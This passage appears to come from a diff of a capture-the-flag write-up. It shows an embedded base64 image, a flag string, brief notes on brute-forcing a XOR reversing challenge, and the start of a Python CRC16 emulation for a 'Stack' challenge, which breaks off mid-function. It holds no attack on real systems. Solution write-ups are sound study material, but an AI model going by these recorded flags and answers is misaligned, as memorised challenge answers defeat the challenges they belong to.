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" alt="Pasted Image"/>
+<p>&ldquo;gu1Yu_s4n_w3lc0m3_y0u&rdquo;</p>
+<h2 id="xor---rev">XOR - Rev</h2>
+<h3 id="description-5">Description</h3>
+<p>Solved with Bruteforce</p>
+<h3 id="explanation-5">Explanation</h3>
+<p>What the code did was take either 2 bytes or 1 byte off your input, xor it and stuff, then I guess execute those two xored bytes&hellip;what ? anyway I just wrote a script that would give me all the possible candidates, I started to realize that the letter &ldquo;A&rdquo; and sometimes &ldquo;X&rdquo; appeared quite often so I went with that.</p>
+<p>Unfortunately I didn&rsquo;t save the code, it was perfect.
+I couldn&rsquo;t understand why my input will be used as opcode</p>
+<h2 id="stack---rev">Stack - Rev</h2>
+<h3 id="description-6">Description</h3>
+<p>Also solved with Bruteforce</p>
+<h3 id="explanation-6">Explanation</h3>
+<p>input goes into program, program reverses the input and takes two bytes, bytes go into crc machine, we get a nice 2 byte chunk and we compare the chunk with the real chunk.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">compute_crc16</span><span class="p">(</span><span class="n">data</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">    Emulates the assembly function g(), processing 2 bytes with:
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">      - initial crc = 0xffff,
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">      - 8 iterations per byte using polynomial 0x8408,
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">      - then complementing (16-bit) and swapping the two bytes.
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">crc</span> <span class="o">=</span> <span class="mh">0xffff</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">curr</span> <span class="o">=</span> <span class="n">b</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">crc</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="p">(</span><span class="n">curr</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="n">crc</span> <span class="o">&gt;&gt;=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="n">crc</span> <span class="o">=</span> <span class="p">(</span><span class="n">crc</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0x8408</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="n">curr</span> <span class="o">&gt;&gt;=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">
